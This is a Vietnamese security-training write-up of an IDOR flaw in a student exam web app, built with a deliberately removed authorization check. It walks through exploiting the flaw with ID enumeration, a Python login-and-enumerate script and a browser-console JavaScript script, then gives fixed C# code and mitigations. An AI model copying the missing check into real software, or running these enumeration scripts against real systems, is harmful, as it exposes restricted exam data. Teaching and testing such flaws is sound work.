# Proof of Concept (PoC) - Lỗ hổng IDOR (Insecure Direct Object Reference)

## Mô tả lỗ hổng

**Loại lỗ hổng**: IDOR - Insecure Direct Object Reference / Broken Access Control  
**Endpoint bị lỗi**: `GET /Student/Exam/{id}`  
**Mức độ**: High  
**Mô tả**: Student có thể xem đề thi của các môn học mà họ không đăng ký bằng cách thay đổi ID trong URL. Ví dụ: Student đăng ký môn Toán có thể xem đề thi của môn Văn, Lý, Hóa, Anh bằng cách thay đổi exam ID trong URL.

## Nguyên nhân

Endpoint `/Student/Exam/{id}` thiếu kiểm tra authorization để xác minh rằng student có đăng ký môn học của đề thi đó hay không. Method chỉ kiểm tra exam có tồn tại không, nhưng không kiểm tra student có quyền xem đề thi đó không.

**Code có lỗ hổng:**

```csharp
[HttpGet("Exam/{id}")]
public async Task<IActionResult> ExamDetail(int id)
{
    var exam = await _examService.GetExamByIdAsync(id);
    if (exam == null) return NotFound();
    
    // VULNERABILITY: Missing authorization check
    // Student can access any exam by changing the ID in URL
    
    var studentId = GetUserId();
    var submission = await _examService.GetStudentSubmissionAsync(id, studentId);
    ViewBag.Submission = submission;
    
    return View(exam);
}
```

**So sánh với code an toàn (đã bị xóa):**

```csharp
// Security check đã bị xóa (code an toàn):
var student = await _examService.GetExamsForStudentAsync(studentId);
if (!student.Any(e => e.Id == id))
{
    return Forbid("You can only view exams for subjects you are enrolled in.");
}
```

## Các bước thực hiện PoC

### Bước 1: Chuẩn bị môi trường

1. Đảm bảo ứng dụng đang chạy trên `http://localhost:5000`
2. Có ít nhất:
   - 1 tài khoản Student (ví dụ: đăng ký môn Toán)
   - Đề thi từ nhiều môn học khác nhau (Toán, Văn, Lý, Hóa, Anh)
   - Biết ID của các đề thi từ các môn học khác nhau

### Bước 2: Xác định Exam ID từ các môn học khác

**Cách 1: Từ giao diện Teacher (nếu có quyền)**
- Đăng nhập với tài khoản Teacher
- Xem danh sách đề thi của các môn học khác
- Lấy Exam ID từ danh sách

**Cách 2: Từ database**
- Query database để lấy Exam ID theo Subject:
  ```sql
  SELECT e.Id, e.Title, s.Name as SubjectName 
  FROM Exams e 
  JOIN Subjects s ON e.SubjectId = s.Id
  ORDER BY e.Id
  ```

**Cách 3: Enumeration (thử các ID)**
- Thử các ID hợp lệ: 1, 2, 3, 4, 5...
- Xem response để xác định ID nào tồn tại

### Bước 3: Đăng nhập với Student account

1. Truy cập: `http://localhost:5000/Auth/Login`
2. Đăng nhập với tài khoản Student (ví dụ: Student đăng ký môn Toán)
3. Xác nhận student chỉ thấy đề thi của môn Toán ở trang `/Student`

### Bước 4: Khai thác lỗ hổng IDOR

**Scenario 1: Student Toán xem đề thi Văn**

1. Đăng nhập với Student account (đăng ký môn Toán)
2. Vào trang: `http://localhost:5000/Student`
3. Xác nhận chỉ thấy đề thi của môn Toán
4. **Thay đổi URL** trực tiếp:
   - Xác định Exam ID của đề thi Văn (ví dụ: ID = 1002)
   - Truy cập: `http://localhost:5000/Student/Exam/1002`
   - ✅ **Kết quả**: Student có thể xem đề thi Văn dù không đăng ký môn Văn

**Scenario 2: Enumeration để tìm đề thi**

1. Đăng nhập với Student account
2. Thử các URL với ID khác nhau:
   ```
   http://localhost:5000/Student/Exam/1
   http://localhost:5000/Student/Exam/2
   http://localhost:5000/Student/Exam/3
   ...
   http://localhost:5000/Student/Exam/1002
   ```
3. Mỗi ID hợp lệ sẽ hiển thị đề thi (nếu tồn tại)
4. ✅ **Kết quả**: Student có thể khám phá tất cả đề thi trong hệ thống

### Bước 5: Sử dụng công cụ để automate

**Sử dụng Python script:**

```python
import requests

BASE_URL = "http://localhost:5000"
STUDENT_USERNAME = "student_math"  # Student đăng ký môn Toán
STUDENT_PASSWORD = "password123"

# Đăng nhập
session = requests.Session()
login_response = session.post(
    f"{BASE_URL}/Auth/Login",
    data={"Username": STUDENT_USERNAME, "Password": STUDENT_PASSWORD},
    allow_redirects=False
)

token = session.cookies.get('access_token')
print(f"[+] Đăng nhập thành công với token: {token[:50]}...")

# Enumeration: Thử các Exam ID
print("\n[*] Enumeration Exam IDs...")
for exam_id in range(1, 101):  # Thử ID từ 1 đến 100
    response = session.get(f"{BASE_URL}/Student/Exam/{exam_id}")
    
    if response.status_code == 200:
        # Parse HTML để lấy title và subject
        if "Exam:" in response.text:
            # Extract exam title (simple regex)
            import re
            title_match = re.search(r'<h2>Exam: ([^<]+)</h2>', response.text)
            subject_match = re.search(r'Subject: ([^<]+)</p>', response.text)
            
            title = title_match.group(1) if title_match else "N/A"
            subject = subject_match.group(1) if subject_match else "N/A"
            
            print(f"[+] FOUND Exam ID {exam_id}: {title} (Subject: {subject})")
    elif response.status_code == 404:
        print(f"[-] Exam ID {exam_id}: Not Found")
    elif response.status_code == 403:
        print(f"[!] Exam ID {exam_id}: Forbidden (có authorization check)")
    else:
        print(f"[?] Exam ID {exam_id}: Status {response.status_code}")

print("\n[*] Enumeration completed!")
```

**Sử dụng Browser:**

1. Đăng nhập với Student account
2. Mở Developer Tools (F12)
3. Vào tab Console
4. Chạy script:

```javascript
// Enumeration script
async function enumerateExams() {
    const baseUrl = window.location.origin;
    const examIds = [1, 2, 3, 4, 5, 100, 1001, 1002, 1003];
    
    console.log('[*] Starting Exam ID enumeration...\n');
    
    for (const id of examIds) {
        try {
            const response = await fetch(`${baseUrl}/Student/Exam/${id}`, {
                method: 'GET',
                credentials: 'include'
            });
            
            if (response.status === 200) {
                const html = await response.text();
                const titleMatch = html.match(/<h2>Exam: ([^<]+)<\/h2>/);
                const subjectMatch = html.match(/Subject: ([^<]+)<\/p>/);
                
                const title = titleMatch ? titleMatch[1] : 'N/A';
                const subject = subjectMatch ? subjectMatch[1] : 'N/A';
                
                console.log(`[+] Exam ID ${id}: ${title} (Subject: ${subject})`);
            } else if (response.status === 404) {
                console.log(`[-] Exam ID ${id}: Not Found`);
            } else {
                console.log(`[?] Exam ID ${id}: Status ${response.status}`);
            }
        } catch (error) {
            console.error(`[X] Exam ID ${id}: Error - ${error.message}`);
        }
    }
    
    console.log('\n[*] Enumeration completed!');
}

// Chạy enumeration
enumerateExams();
```

### Bước 6: Xác minh lỗ hổng

1. **Xác nhận Student có thể xem đề thi của môn học khác:**
   - Student đăng ký môn Toán có thể xem đề thi Văn (ID: 1002)
   - Student có thể xem đề thi của tất cả các môn học

2. **Xác nhận thông tin nhạy cảm bị lộ:**
   - Xem được câu hỏi của các môn học khác
   - Xem được các submissions của student khác (nếu có)
   - Xem được điểm số của các student khác (nếu hiển thị)

3. **Xác nhận có thể submit bài cho môn học khác:**
   - Kiểm tra xem có thể submit bài cho đề thi của môn học khác không

## Kết quả mong đợi

- ✅ Student có thể truy cập đề thi của các môn học khác bằng cách thay đổi ID
- ✅ Response 200 OK thay vì 403 Forbidden
- ✅ Đề thi được hiển thị đầy đủ (Title, Content, Subject)
- ✅ Student có thể xem tất cả đề thi trong hệ thống
- ✅ Enumeration thành công - có thể khám phá tất cả Exam IDs

## Tác động

1. **Lộ thông tin nhạy cảm**: Student có thể xem câu hỏi của các môn học khác
2. **Phá vỡ tính bảo mật**: Vi phạm nguyên tắc "need-to-know"
3. **Gian lận**: Student có thể chuẩn bị trước cho các đề thi của môn học khác
4. **Thiếu công bằng**: Student có thể có lợi thế không công bằng
5. **Vi phạm chính sách**: Hệ thống không đảm bảo tính riêng tư và phân quyền

## Cách khắc phục

1. **Thêm authorization check**: Kiểm tra student có đăng ký môn học của đề thi không
2. **Sử dụng indirect reference**: Sử dụng token/ID ngẫu nhiên thay vì sequential ID
3. **Access control**: Kiểm tra ownership/subject enrollment trước khi hiển thị

**Code sửa lỗi:**

```csharp
[HttpGet("Exam/{id}")]
public async Task<IActionResult> ExamDetail(int id)
{
    var exam = await _examService.GetExamByIdAsync(id);
    if (exam == null) return NotFound();
    
    // Security: Verify student is enrolled in the subject of this exam
    var studentId = GetUserId();
    var studentExams = await _examService.GetExamsForStudentAsync(studentId);
    
    if (!studentExams.Any(e => e.Id == id))
    {
        return Forbid("You can only view exams for subjects you are enrolled in.");
    }
    
    var submission = await _examService.GetStudentSubmissionAsync(id, studentId);
    ViewBag.Submission = submission;
    
    return View(exam);
}
```

**Hoặc sử dụng authorization policy:**

```csharp
// Thêm authorization policy
builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("CanViewExam", policy =>
        policy.Requirements.Add(new ExamAccessRequirement()));
});

// Sử dụng trong controller
[HttpGet("Exam/{id}")]
[Authorize(Policy = "CanViewExam")]
public async Task<IActionResult> ExamDetail(int id)
{
    // ...
}
```

## Chi tiết kỹ thuật

### Vấn đề trong code:

**File:** `Controllers/View/StudentController.cs`

**Method ExamDetail (có lỗ hổng):**
```csharp
[HttpGet("Exam/{id}")]
public async Task<IActionResult> ExamDetail(int id)
{
    var exam = await _examService.GetExamByIdAsync(id);
    if (exam == null) return NotFound();
    
    // VULNERABILITY: Missing authorization check
    // Student can access any exam by changing ID in URL
    
    var studentId = GetUserId();
    var submission = await _examService.GetStudentSubmissionAsync(id, studentId);
    ViewBag.Submission = submission;
    
    return View(exam);
}
```

**So sánh với code an toàn (đã bị xóa):**
```csharp
// Security check đã bị xóa:
var student = await _examService.GetExamsForStudentAsync(studentId);
if (!student.Any(e => e.Id == id))
{
    return Forbid("You can only view exams for subjects you are enrolled in.");
}
```

### Flow của lỗ hổng:

1. **Student đăng nhập** và vào trang `/Student`
2. **Student chỉ thấy** đề thi của môn học họ đăng ký (ví dụ: Toán)
3. **Student thay đổi URL** từ `/Student/Exam/1` (Toán) thành `/Student/Exam/1002` (Văn)
4. **Server chỉ kiểm tra** exam có tồn tại không (ID hợp lệ)
5. **Server không kiểm tra** student có đăng ký môn học của đề thi không
6. **Đề thi được hiển thị** → Student xem được đề thi của môn học khác

### Cách khai thác:

1. **Enumeration**: Thử các ID từ 1 đến N để tìm tất cả đề thi
2. **Direct Access**: Nếu biết ID của đề thi môn khác, truy cập trực tiếp
3. **Automation**: Sử dụng script để tự động hóa việc enumeration

## Lưu ý

- Lỗ hổng này được tạo ra **có chủ đích** cho mục đích training/giáo dục về bảo mật
- Trong môi trường production, **LUÔN kiểm tra authorization** trước khi truy cập tài nguyên
- Luôn áp dụng nguyên tắc **"Least Privilege"** - chỉ cho phép truy cập tài nguyên cần thiết
- **IDOR thường xảy ra** khi sử dụng sequential ID dễ đoán
- **Kiểm tra ownership/authorization** ở mọi endpoint có tham số ID
- **Không tin tưởng client** - luôn validate và kiểm tra authorization ở server-side

## Checklist test

- [ ] Đăng nhập với Student account (đăng ký 1 môn học)
- [ ] Xác nhận chỉ thấy đề thi của môn học đã đăng ký
- [ ] Thử truy cập đề thi của môn học khác bằng cách thay đổi ID trong URL
- [ ] Xác nhận có thể xem đề thi của môn học khác (200 OK)
- [ ] Enumeration: Thử các ID từ 1-100 để tìm đề thi
- [ ] Xác nhận có thể khám phá tất cả đề thi trong hệ thống
- [ ] Verify có thể xem được Content, Title, Subject của đề thi khác
- [ ] Test với các môn học khác nhau (Văn, Lý, Hóa, Anh)

